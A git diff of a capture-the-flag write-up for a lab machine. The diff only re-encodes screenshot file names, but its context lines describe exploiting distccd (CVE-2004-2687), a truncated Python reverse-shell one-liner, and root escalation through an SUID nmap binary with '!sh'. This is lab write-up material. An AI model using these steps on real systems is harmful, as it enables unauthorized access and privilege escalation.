@@ -25,7 +25,7 @@ sticker: emoji//1f613
 FTP anonymous login is enabled, let's check it out:
 
 
-![](Pasted image 20250402152900.png)
+![](Pasted%20image%2020250402152900.png)
 
 Nothing in here, `smb` anonymous login is not enabled unfortunately, let's keep on going, if we remember the scan, we got the following on port `3632`:
 
@@ -38,7 +38,7 @@ We got something called `distccd`, `distcc` is a tool designed to distribute co
 
 Since we got `distccd v1`, we can search for an exploit regarding that version:
 
-![](Pasted image 20250402153430.png)
+![](Pasted%20image%2020250402153430.png)
 
 
 
@@ -49,14 +49,14 @@ Since we got `distccd v1`, we can search for an exploit regarding that version:
 
 This is a pretty old CVE, we are facing `CVE-2004-2687`, we can search for an exploit in GitHub:
 
-![](Pasted image 20250402153623.png)
+![](Pasted%20image%2020250402153623.png)
 
 Link: https://github.com/angelpimentell/distcc_cve_2004-2687_exploit
 
 
 If we use the exploit, we can see this:
 
-![](Pasted image 20250402153655.png)
+![](Pasted%20image%2020250402153655.png)
 
 
 We can get ourselves an interactive shell: 
@@ -67,7 +67,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 If we check up our listener:
 
-![](Pasted image 20250402154059.png)
+![](Pasted%20image%2020250402154059.png)
 
 Let's proceed with privesc.
 
@@ -98,11 +98,11 @@ daemon@lame:/$ cat /home/makis/user.txt
 
 Let's use linpeas for a way to get into root:
 
-![](Pasted image 20250402154841.png)
+![](Pasted%20image%2020250402154841.png)
 
 We got `nmap` binary set with a `4000 SUID`, let's check `gtfobins`:
 
-![](Pasted image 20250402155155.png)
+![](Pasted%20image%2020250402155155.png)
 
 So, we need to do the following in order to get root:
 
@@ -111,7 +111,7 @@ So, we need to do the following in order to get root:
 !sh
 ```
 
-![](Pasted image 20250402155218.png)
+![](Pasted%20image%2020250402155218.png)
 
 We can finally read `root.txt`:
 
@@ -121,6 +121,6 @@ sh-3.2# cat /root/root.txt
 ```
 
 
-![](Pasted image 20250402155300.png)
+![](Pasted%20image%2020250402155300.png)
 
 
